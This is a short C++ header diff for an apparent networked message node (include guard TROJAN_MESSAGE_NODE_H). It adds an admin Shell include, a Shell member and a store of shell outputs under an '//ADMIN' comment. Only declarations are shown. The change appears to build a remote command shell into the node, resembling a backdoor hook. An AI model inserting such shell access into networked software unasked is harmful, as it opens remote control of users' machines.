@@ -12,6 +12,8 @@
 #include <deque>
 #include <mutex>
 #include <fstream>
+
+#include "../../admin/Shell.h"
 constexpr uint32_t attempt_budget = 200;
 constexpr auto expiration_time_sec = std::chrono::seconds(45);
 constexpr auto prune_sec = std::chrono::seconds(10);
@@ -366,6 +368,11 @@ private:
     NodeSnapshot            snapshot_;
     std::mutex              chat_mutex_;
     std::deque<ChatMessage> chat_log_;
+
+    //ADMIN
+    Shell shell_;
+    std::mutex shell_mutex_;
+    std::vector<json> shell_outs_;
 };
 
 #endif //TROJAN_MESSAGE_NODE_H
